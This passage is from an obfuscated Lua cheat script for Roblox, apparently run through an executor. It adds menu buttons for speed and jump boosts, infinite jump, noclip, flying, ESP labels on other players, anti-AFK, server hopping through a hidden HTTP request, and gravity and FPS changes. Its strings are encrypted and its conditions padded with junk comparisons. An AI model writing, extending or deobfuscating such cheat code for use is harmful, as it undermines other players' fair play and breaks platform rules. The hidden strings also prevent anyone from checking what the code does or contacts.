button(visP, LUAOBFUSACTOR_DECRYPT_STR_0("\90\134\207\64\164\93\40\69", "\49\24\234\174\35\207\50\93"), function()
	Lighting['Brightness'] = 0;
	Lighting['ClockTime'] = 0;
end);
local plrP = Pages[LUAOBFUSACTOR_DECRYPT_STR_0("\60\254\252\145\116\30", "\17\108\146\157\232")];
label(plrP, LUAOBFUSACTOR_DECRYPT_STR_0("\123\207\21\244\42\186", "\200\43\163\116\141\79"), 18);
for _, s in ipairs({20,25,30,35,40,50,60,70,80,100,120,150,200}) do
	button(plrP, LUAOBFUSACTOR_DECRYPT_STR_0("\140\38\56\134\180\180", "\131\223\86\93\227\208\148") .. s, function()
		pcall(function()
			LocalPlayer['Character']['Humanoid']['WalkSpeed'] = s;
		end);
	end);
end
button(plrP, LUAOBFUSACTOR_DECRYPT_STR_0("\209\64\165\179\9\245\208\85\179\179\25", "\213\131\37\214\214\125"), function()
	pcall(function()
		LocalPlayer['Character']['Humanoid']['WalkSpeed'] = 16;
	end);
end);
for _, j in ipairs({50,70,90,100,120,150,180,200}) do
	button(plrP, LUAOBFUSACTOR_DECRYPT_STR_0("\12\62\40\175\161", "\129\70\75\69\223") .. j, function()
		pcall(function()
			LocalPlayer['Character']['Humanoid']['JumpPower'] = j;
		end);
	end);
end
button(plrP, LUAOBFUSACTOR_DECRYPT_STR_0("\116\206\224\236\104\175\108\222\254\249", "\143\38\171\147\137\28"), function()
	pcall(function()
		LocalPlayer['Character']['Humanoid']['JumpPower'] = 50;
	end);
end);
local infJump = false;
toggle(plrP, LUAOBFUSACTOR_DECRYPT_STR_0("\249\140\191\250\13\234\192\213\194\147\230\14\243", "\180\176\226\217\147\99\131"), false, function(v)
	infJump = v;
end);
UserInputService['JumpRequest']:Connect(function()
	if (infJump or (3637 >= 3770)) then
		pcall(function()
			LocalPlayer['Character']['Humanoid']:ChangeState(Enum['HumanoidStateType'].Jumping);
		end);
	end
end);
local noclip = false;
toggle(plrP, LUAOBFUSACTOR_DECRYPT_STR_0("\253\182\44\11\218\169", "\103\179\217\79"), false, function(v)
	noclip = v;
	if (v or (2379 > 4578)) then
		local c;
		c = RunService['Stepped']:Connect(function()
			if (not noclip or (3404 > 4503)) then
				c:Disconnect();
				return;
			end
			pcall(function()
				for _, p in pairs(LocalPlayer['Character']:GetDescendants()) do
					if (p:IsA(LUAOBFUSACTOR_DECRYPT_STR_0("\104\182\15\208\113\141\177\94", "\195\42\215\124\181\33\236")) or (483 > 743)) then
						p['CanCollide'] = false;
					end
				end
			end);
		end);
	end
end);
local flying = false;
toggle(plrP, LUAOBFUSACTOR_DECRYPT_STR_0("\43\85\46", "\152\109\57\87\94\69"), false, function(v)
	flying = v;
	if (not v or (3506 <= 1309)) then
		return;
	end
	local hrp = LocalPlayer['Character'] and LocalPlayer['Character']:FindFirstChild(LUAOBFUSACTOR_DECRYPT_STR_0("\209\194\7\162\176\221\93\172\203\216\5\183\142\211\70\188", "\200\153\183\106\195\222\178\52"));
	if not hrp then
		return;
	end
	local bv = Instance.new(LUAOBFUSACTOR_DECRYPT_STR_0("\16\236\140\36\127\95\62\236\139\52\93\67", "\58\82\131\232\93\41"));
	bv['MaxForce'] = Vector3.new(8999999488, 8999999488, 8999999488);
	bv['Parent'] = hrp;
	local bg = Instance.new(LUAOBFUSACTOR_DECRYPT_STR_0("\161\88\212\12\122\38\145\88", "\95\227\55\176\117\61"));
	bg['MaxTorque'] = Vector3.new(8999999488, 8999999488, 8999999488);
	bg['Parent'] = hrp;
	task.spawn(function()
		while flying and hrp and hrp['Parent'] do
			local dir = Vector3['zero'];
			local look, right = Camera['CFrame']['LookVector'], Camera['CFrame']['RightVector'];
			if ((2454 > 578) and (2955 == 2955) and UserInputService:IsKeyDown(Enum['KeyCode'].W)) then
				dir += look
			end
			if ((930 < 4458) and (UserInputService:IsKeyDown(Enum['KeyCode'].S) or (2903 == 1495))) then
				dir -= look
			end
			if UserInputService:IsKeyDown(Enum['KeyCode'].A) then
				dir -= right
			end
			if ((662 <= 972) and UserInputService:IsKeyDown(Enum['KeyCode'].D)) then
				dir += right
			end
			if ((4370 == 4370) and (4546 >= 2275) and UserInputService:IsKeyDown(Enum['KeyCode'].Space)) then
				dir += Vector3['yAxis']
			end
			if (((819 >= 22) and UserInputService:IsKeyDown(Enum['KeyCode'].LeftShift)) or (4762 <= 861)) then
				dir -= Vector3['yAxis']
			end
			bv['Velocity'] = ((dir['Magnitude'] > 0) and (dir['Unit'] * 75)) or Vector3['zero'];
			bg['CFrame'] = Camera['CFrame'];
			RunService['RenderStepped']:Wait();
		end
		if bv then
			bv:Destroy();
		end
		if (bg or (1412 == 4264)) then
			bg:Destroy();
		end
	end);
end);
button(plrP, LUAOBFUSACTOR_DECRYPT_STR_0("\61\77\19", "\203\120\30\67\43"), function()
	for _, plr in pairs(Players:GetPlayers()) do
		if (((3162 == 3162) and (plr ~= LocalPlayer) and plr['Character'] and plr['Character']:FindFirstChild(LUAOBFUSACTOR_DECRYPT_STR_0("\217\48\64\238\215\254\44\73\221\214\254\49\125\238\203\229", "\185\145\69\45\143"))) or (3168 < 2153)) then
			if (plr['Character']['HumanoidRootPart']:FindFirstChild(LUAOBFUSACTOR_DECRYPT_STR_0("\189\30\15\163\249\185\47", "\188\234\127\121\198")) or (4976 < 1332)) then
				continue;
			end
			local bill = Instance.new(LUAOBFUSACTOR_DECRYPT_STR_0("\26\59\31\143\58\61\18\145\60\21\6\138", "\227\88\82\115"));
			bill['Name'] = LUAOBFUSACTOR_DECRYPT_STR_0("\116\30\172\162\39\64\115", "\19\35\127\218\199\98");
			bill['Size'] = UDim2.new(0, 100, 0, 22);
			bill['AlwaysOnTop'] = true;
			bill['Adornee'] = plr['Character']['HumanoidRootPart'];
			bill['Parent'] = plr['Character']['HumanoidRootPart'];
			local t = Instance.new(LUAOBFUSACTOR_DECRYPT_STR_0("\40\254\18\246\48\250\8\231\16", "\130\124\155\106"));
			t['Size'] = UDim2.new(1, 0, 1, 0);
			t['BackgroundTransparency'] = 1;
			t['Text'] = plr['Name'];
			t['TextColor3'] = Color3.fromRGB(200, 200, 230);
			t['Font'] = Enum['Font']['GothamBold'];
			t['TextSize'] = 11;
			t['Parent'] = bill;
		end
	end
end);
button(plrP, LUAOBFUSACTOR_DECRYPT_STR_0("\231\206\251\160\181\243\60\154\230\251", "\223\181\171\150\207\195\150\28"), function()
	for _, plr in pairs(Players:GetPlayers()) do
		pcall(function()
			local hrp = plr['Character'] and plr['Character']:FindFirstChild(LUAOBFUSACTOR_DECRYPT_STR_0("\100\47\238\175\7\67\51\231\156\6\67\46\211\175\27\88", "\105\44\90\131\206"));
			if ((hrp and hrp:FindFirstChild(LUAOBFUSACTOR_DECRYPT_STR_0("\200\225\164\188\45\13\207", "\94\159\128\210\217\104"))) or (2369 > 4429)) then
				hrp['WaveESP']:Destroy();
			end
		end);
	end
end);
button(plrP, LUAOBFUSACTOR_DECRYPT_STR_0("\113\247\18\182\31\94\223\81", "\26\48\153\102\223\63\31\153"), function()
	LocalPlayer['Idled']:Connect(function()
		VirtualUser:CaptureController();
		VirtualUser:ClickButton2(Vector2.new());
	end);
end);
button(plrP, LUAOBFUSACTOR_DECRYPT_STR_0("\48\69\231\252\11\78", "\147\98\32\141"), function()
	TeleportService:Teleport(game.PlaceId, LocalPlayer);
end);
button(plrP, LUAOBFUSACTOR_DECRYPT_STR_0("\43\70\241\220\3\68\11\48\76\243", "\43\120\35\131\170\102\54"), function()
	pcall(function()
		local req = get_request();
		if ((4095 >= 3183) and not req) then
			return;
		end
		local resp = req({[LUAOBFUSACTOR_DECRYPT_STR_0("\97\20\139", "\228\52\102\231\214\197\208")]=(LUAOBFUSACTOR_DECRYPT_STR_0("\22\244\97\218\249\209\86\153\25\225\120\207\249\197\11\217\28\236\122\210\164\136\22\219\81\246\36\133\237\138\20\211\13\175", "\182\126\128\21\170\138\235\121") .. game['PlaceId'] .. LUAOBFUSACTOR_DECRYPT_STR_0("\196\201\48\244\144\22\34\21\196\234\32\228\138\26\51\89\152\213\39\242\169\1\52\3\153\135\20\245\133\85\60\15\134\211\33\187\210\67", "\102\235\186\85\134\230\115\80")),[LUAOBFUSACTOR_DECRYPT_STR_0("\122\9\42\87\125\208", "\66\55\108\94\63\18\180")]=LUAOBFUSACTOR_DECRYPT_STR_0("\51\168\177", "\57\116\237\229\87\71")});
		local data = HttpService:JSONDecode(resp.Body);
		for _, s in pairs(data['data'] or {}) do
			if (((s['playing'] < s['maxPlayers']) and (s['id'] ~= game['JobId'])) or (3711 < 1008)) then
				TeleportService:TeleportToPlaceInstance(game.PlaceId, s.id, LocalPlayer);
				break;
			end
		end
	end);
end);
button(plrP, LUAOBFUSACTOR_DECRYPT_STR_0("\152\180\254\226\99", "\39\202\209\141\135\23\142"), function()
	pcall(function()
		LocalPlayer['Character']['Humanoid']['Health'] = 0;
	end);
end);
button(plrP, LUAOBFUSACTOR_DECRYPT_STR_0("\204\58\29", "\152\159\83\105\106\82"), function()
	pcall(function()
		LocalPlayer['Character']['Humanoid']['Sit'] = true;
	end);
end);
button(plrP, LUAOBFUSACTOR_DECRYPT_STR_0("\180\200\66\251\221", "\60\225\166\49\146\169"), function()
	pcall(function()
		LocalPlayer['Character']['Humanoid']['Sit'] = false;
	end);
end);
local worldP = Pages[LUAOBFUSACTOR_DECRYPT_STR_0("\24\17\61\38\5", "\103\79\126\79\74\97")];
label(worldP, LUAOBFUSACTOR_DECRYPT_STR_0("\141\112\193\127\90", "\122\218\31\179\19\62"), 18);
button(worldP, LUAOBFUSACTOR_DECRYPT_STR_0("\139\228\204\216", "\37\211\182\173\161\169\193"), function()
	for _, p in pairs(workspace:GetDescendants()) do
		if ((p:IsA(LUAOBFUSACTOR_DECRYPT_STR_0("\213\59\94\220\24\122\171\227", "\217\151\90\45\185\72\27")) and (p['Transparency'] < 1)) or (1049 <= 906)) then
			p['LocalTransparencyModifier'] = 0.65;
		end
	end
end);
button(worldP, LUAOBFUSACTOR_DECRYPT_STR_0("\241\121\234\29\64\198\60\223\32\87\218", "\54\163\28\135\114"), function()
	for _, p in pairs(workspace:GetDescendants()) do
		if ((4628 == 4628) and (4513 > 2726) and p:IsA(LUAOBFUSACTOR_DECRYPT_STR_0("\10\218\78\135\126\126\58\207", "\31\72\187\61\226\46"))) then
			p['LocalTransparencyModifier'] = 0;
		end
	end
end);
button(worldP, LUAOBFUSACTOR_DECRYPT_STR_0("\229\54\112\146\114\112\40\204\5\72", "\68\163\102\35\178\39\30"), function()
	pcall(function()
		setfpscap(0);
	end);
end);
button(worldP, LUAOBFUSACTOR_DECRYPT_STR_0("\152\64\233\135\85\229", "\113\222\16\186\167\99\213\227"), function()
	pcall(function()
		setfpscap(60);
	end);
end);
button(worldP, LUAOBFUSACTOR_DECRYPT_STR_0("\8\62\200\182\127\92\171", "\150\78\110\155"), function()
	pcall(function()
		setfpscap(120);
	end);
end);
button(worldP, LUAOBFUSACTOR_DECRYPT_STR_0("\163\245\20\161\246\74\239", "\32\229\165\71\129\196\126\223"), function()
	pcall(function()
		setfpscap(240);
	end);
end);
button(worldP, LUAOBFUSACTOR_DECRYPT_STR_0("\228\155\197\151\136\193\218\201\232\142\150", "\181\163\233\164\225\225"), function()
	workspace['Gravity'] = 40;
end);
button(worldP, LUAOBFUSACTOR_DECRYPT_STR_0("\119\153\63\97\89\159\39\55\126\132\44\122\81\135", "\23\48\235\94"), function()
	workspace['Gravity'] = 196.2;
end);
button(worldP, LUAOBFUSACTOR_DECRYPT_STR_0("\91\200\217\75\94\39\203\60\242\209\90\95", "\178\28\186\184\61\55\83"), function()
	workspace['Gravity'] = 400;
end);
button(worldP, LUAOBFUSACTOR_DECRYPT_STR_0("\227\223\70\42\251\26\236\132\247\66\46\253", "\149\164\173\39\92\146\110"), function()
	workspace['Gravity'] = 0;
end);
button(worldP, LUAOBFUSACTOR_DECRYPT_STR_0("\208\43\21\30\8\91\195\38\2\11\19\24\255\34\3", "\123\147\71\112\127\122"), function()
	for _, v in pairs(workspace:GetDescendants()) do
		if (v:IsA(LUAOBFUSACTOR_DECRYPT_STR_0("\252\204\144\101\79\207\193\135\84\75\197\217\150\116\84", "\38\172\173\226\17")) or v:IsA(LUAOBFUSACTOR_DECRYPT_STR_0("\121\3\45\230\65", "\143\45\113\76")) or v:IsA(LUAOBFUSACTOR_DECRYPT_STR_0("\154\189\29\49", "\92\216\216\124"))) then
			v['Enabled'] = false;
		end
	end
end);
local miscP = Pages[LUAOBFUSACTOR_DECRYPT_STR_0("\118\59\191\67", "\157\59\82\204\32")];
label(miscP, LUAOBFUSACTOR_DECRYPT_STR_0("\21\55\240\249\169\165\147\148\32\42\241\251", "\209\88\94\131\154\137\138\179"), 18);
button(miscP, LUAOBFUSACTOR_DECRYPT_STR_0("\11\174\212\101\94\9\62\32\1\165", "\66\72\193\164\28\126\67\81"), function()
	if setclipboard then
		setclipboard(game.JobId);
	end
end);
button(miscP, LUAOBFUSACTOR_DECRYPT_STR_0("\196\35\184\65\102\70\235\45\171\93\15\114", "\22\135\76\200\56\70"), function()
	if (setclipboard or (1481 >= 2658) or (54 == 395)) then
		setclipboard(tostring(game.PlaceId));
	end
end);
button(miscP, LUAOBFUSACTOR_DECRYPT_STR_0("\174\63\232\61\29\212\158\53\234\13\89", "\129\237\80\152\68\61"), function()
	if ((82 == 82) and (setclipboard or (3220 == 1364))) then
		setclipboard(tostring(LocalPlayer.UserId));
	end
end);
button(miscP, LUAOBFUSACTOR_DECRYPT_STR_0("\97\186\13\253\8\87\104\93\169\29\246\14\4", "\56\49\200\100\147\124\119"), function()
	for _, p in pairs(Players:GetPlayers()) do
		print(p.Name, p.UserId);
	end
end);
button(miscP, LUAOBFUSACTOR_DECRYPT_STR_0("\234\44\186\245\214\59\255\211\196\63\173\241\207\42\186\226", "\144\172\94\223"), function()
	pcall(function()
		for _, p in pairs(LocalPlayer['Character']:GetDescendants()) do
			if (p:IsA(LUAOBFUSACTOR_DECRYPT_STR_0("\6\14\177\66\20\14\176\83", "\39\68\111\194")) or (1054 > 3392)) then
				p['Anchored'] = true;
			end
		end
	end);
end);
button(miscP, LUAOBFUSACTOR_DECRYPT_STR_0("\227\168\225\213\124\178\204\163", "\215\182\198\135\167\25"), function()
	pcall(function()
		for _, p in pairs(LocalPlayer['Character']:GetDescendants()) do
			if (p:IsA(LUAOBFUSACTOR_DECRYPT_STR_0("\175\72\249\77\189\72\248\92", "\40\237\41\138")) or (676 >= 1642)) then
				p['Anchored'] = false;
			end
		end
	end);
end);
button(miscP, LUAOBFUSACTOR_DECRYPT_STR_0("\238\122\236\241\89\206\118\246\253\10\143\119\246\241\79\201\96\179", "\42\167\20\154\152"), function()
	pcall(function()
		for _, p in pairs(LocalPlayer['Character']:GetDescendants()) do
			if (p:IsA(LUAOBFUSACTOR_DECRYPT_STR_0("\104\255\177\71\65\32\88\234", "\65\42\158\194\34\17")) or p:IsA(LUAOBFUSACTOR_DECRYPT_STR_0("\62\34\81\13\33", "\142\122\71\50\108\77\141\123"))) then
				p['Transparency'] = 1;
			end
		end
	end);
end);
button(miscP, LUAOBFUSACTOR_DECRYPT_STR_0("\35\171\236\17\57\25\167", "\91\117\194\159\120"), function()
	pcall(function()
		for _, p in pairs(LocalPlayer['Character']:GetDescendants()) do
			if (p:IsA(LUAOBFUSACTOR_DECRYPT_STR_0("\56\28\45\29\5\240\54\14", "\68\122\125\94\120\85\145")) and (p['Name'] ~= LUAOBFUSACTOR_DECRYPT_STR_0("\63\9\194\95\198\214\179\19\46\192\81\220\233\187\5\8", "\218\119\124\175\62\168\185"))) then
				p['Transparency'] = 0;
			end
		end
	end);
end);
button(miscP, LUAOBFUSACTOR_DECRYPT_STR_0("\135\249\79\132\141\245\73\192", "\164\197\144\40"), function()
	pcall(function()
		local head = LocalPlayer['Character'] and LocalPlayer['Character']:FindFirstChild(LUAOBFUSACTOR_DECRYPT_STR_0("\171\245\171\143", "\214\227\144\202\235\189"));
		if (head or (581 < 282)) then
			head['Size'] = Vector3.new(5, 5, 5);
		end
	end);
end);
button(miscP, LUAOBFUSACTOR_DECRYPT_STR_0("\195\170\149\118\17\191\19\20\232\164\131", "\92\141\197\231\27\112\211\51"), function()
	pcall(function()
		local head = LocalPlayer['Character'] and LocalPlayer['Character']:FindFirstChild(LUAOBFUSACTOR_DECRYPT_STR_0("\206\250\139\167", "\177\134\159\234\195"));
		if (((4136 > 2397) and head) or (4609 < 2495)) then
			head['Size'] = Vector3.new(2, 1, 1);
		end
	end);
end);
button(miscP, LUAOBFUSACTOR_DECRYPT_STR_0("\142\251\54\174", "\169\221\139\95\192"), function()
	pcall(function()
		local hrp = LocalPlayer['Character'] and LocalPlayer['Character']:FindFirstChild(LUAOBFUSACTOR_DECRYPT_STR_0("\246\158\114\62\44\41\215\143\77\48\45\50\238\138\109\43", "\70\190\235\31\95\66"));
		if not hrp then
			return;
		end
		local bg = Instance.new(LUAOBFUSACTOR_DECRYPT_STR_0("\152\237\30\255\196\180\229\15\234\228\168\212\31\234\234\185\235\14\255", "\133\218\130\122\134"));
		bg['MaxTorque'] = Vector3.new(0, 8999999488, 0);
		bg['AngularVelocity'] = Vector3.new(0, 20, 0);
		bg['Parent'] = hrp;
		task.delay(5, function()
			if ((1152 == 1152) and bg) then
				bg:Destroy();
			end
		end);
	end);
end);
button(miscP, LUAOBFUSACTOR_DECRYPT_STR_0("\20\246\228\204\156\128\57\49\250\241\197", "\88\92\159\131\164\188\195"), function()
	Camera['FieldOfView'] = 120;
end);
button(miscP, LUAOBFUSACTOR_DECRYPT_STR_0("\174\33\173\70\214\231\157\163\47\178\78\197\234", "\189\224\78\223\43\183\139"), function()
	Camera['FieldOfView'] = 70;
end);
button(miscP, LUAOBFUSACTOR_DECRYPT_STR_0("\8\245\152\5\213\110\204\143\4\210\33\242", "\161\78\156\234\118"), function()
	LocalPlayer['CameraMode'] = Enum['CameraMode']['LockFirstPerson'];
end);
button(miscP, LUAOBFUSACTOR_DECRYPT_STR_0("\147\191\192\206\163\247\249\217\181\164\198\210", "\188\199\215\169"), function()
	LocalPlayer['CameraMode'] = Enum['CameraMode']['Classic'];
end);
local setP = Pages[LUAOBFUSACTOR_DECRYPT_STR_0("\207\12\75\111\225\242\14\76", "\136\156\105\63\27")];
label(setP, LUAOBFUSACTOR_DECRYPT_STR_0("\40\137\109\32\18\130\126\39", "\84\123\236\25"), 18);
local toggleKey = Enum['KeyCode']['RightControl'];
label(setP, LUAOBFUSACTOR_DECRYPT_STR_0("\196\132\173\16\160\176\176\160\175\14\246\245\194\130\173\31\184\150\255\133\190\5\163\185", "\213\144\235\202\119\204"));
button(setP, "Key → LeftControl", function()
	toggleKey = Enum['KeyCode']['LeftControl'];
end);
button(setP, "Key → RightShift", function()
	toggleKey = Enum['KeyCode']['RightShift'];
end);
button(setP, "Key → F6", function()
	toggleKey = Enum['KeyCode']['F6'];
end);
button(setP, "Key → Insert", function()
	toggleKey = Enum['KeyCode']['Insert'];
end);
button(setP, LUAOBFUSACTOR_DECRYPT_STR_0("\7\29\205\62\58\44\84\99\43\221\56\33\51\89", "\45\67\120\190\74\72\67"), function()
	Gui:Destroy();
end);
TopBar['InputBegan']:Connect(function(input)
	if ((input['UserInputType'] == Enum['UserInputType']['MouseButton1']) or (input['UserInputType'] == Enum['UserInputType']['Touch'])) then
		Main['Visible'] = not Main['Visible'];
		if ((1896 <= 3422) and (Main['Visible'] or (4334 == 4245))) then
			Main['Size'] = UDim2.new(0, 0, 0, 0);
			TweenService:Create(Main, TweenInfo.new(0.35, Enum['EasingStyle'].Quint, Enum['EasingDirection'].Out), {[LUAOBFUSACTOR_DECRYPT_STR_0("\19\43\247\160", "\137\64\66\141\197\153\232\142")]=UDim2.new(0, 660, 0, 500)}):Play();
			if not ACCESS then
				switch(LUAOBFUSACTOR_DECRYPT_STR_0("\47\223\37\175\134", "\232\99\176\66\198"));
			end
		end
	end
end);
CloseBtn['MouseButton1Click']:Connect(function()
	TweenService:Create(Main, TweenInfo.new(0.2, Enum['EasingStyle'].Quint), {[LUAOBFUSACTOR_DECRYPT_STR_0("\223\40\50\3", "\76\140\65\72\102\27\237\153")]=UDim2.new(0, 0, 0, 0)}):Play();
	task.delay(0.2, function()
		Main['Visible'] = false;
	end);
end);
UserInputService['InputBegan']:Connect(function(input, gp)
	if (gp or (4276 <= 3031) or (990 > 1620)) then
		return;
	end
	if ((input['KeyCode'] ~= toggleKey) or (877 > 4695)) then
	else
		Main['Visible'] = not Main['Visible'];
		if ((2691 >= 1851) and ((Main['Visible'] and not ACCESS) or (4782 <= 1199))) then
			switch(LUAOBFUSACTOR_DECRYPT_STR_0("\102\213\17\219\217", "\222\42\186\118\178\183\97"));
		end
	end
end);
if UserInputService['TouchEnabled'] then
	TopBar['Size'] = UDim2.new(0.78, 0, 0, 38);
	TopBar['Position'] = UDim2.new(0.11, 0, 0, 10);
	Main['Size'] = UDim2.new(0.95, 0, 0.85, 0);
	Main['Position'] = UDim2.new(0.025, 0, 0.07, 0);
end
task.spawn(function()
	local w = Instance.new(LUAOBFUSACTOR_DECRYPT_STR_0("\105\233\92\158\113\237\70\143\81", "\234\61\140\36"));
	w['Size'] = UDim2.new(0, 260, 0, 36);
	w['Position'] = UDim2.new(0.5, -130, 0.15, 0);
	w['BackgroundColor3'] = Color3.fromRGB(28, 28, 36);
	w['Text'] = LUAOBFUSACTOR_DECRYPT_STR_0("\22\220\172\119\79\18\222\168\123\31\53\157\182\125\14\37\216\190", "\111\65\189\218\18");
	w['TextColor3'] = Color3.fromRGB(240, 240, 250);
	w['Font'] = Enum['Font']['GothamMedium'];
	w['TextSize'] = 13;
	w['Parent'] = Gui;
	Instance.new(LUAOBFUSACTOR_DECRYPT_STR_0("\118\98\56\58\25\82\170\81", "\207\35\43\123\85\107\60"), w)['CornerRadius'] = UDim.new(0, 10);
	w['TextTransparency'] = 1;
	TweenService:Create(w, TweenInfo.new(0.4), {[LUAOBFUSACTOR_DECRYPT_STR_0("\68\175\184\254\77\98\171\174\249\105\113\184\165\228\122\105", "\25\16\202\192\138")]=0}):Play();
	task.wait(1.7);
	TweenService:Create(w, TweenInfo.new(0.35), {[LUAOBFUSACTOR_DECRYPT_STR_0("\201\206\181\246\157\230\252\197\190\242\168\230\248\197\174\251", "\148\157\171\205\130\201")]=1,[LUAOBFUSACTOR_DECRYPT_STR_0("\1\213\119\34\214\228\44\193\122\45\229\228\34\218\103\57\208\228\38\218\119\48", "\150\67\180\20\73\177")]=1}):Play();
	task.wait(0.4);
	w:Destroy();
end);
switch(LUAOBFUSACTOR_DECRYPT_STR_0("\161\23\29\68\131", "\45\237\120\122"));
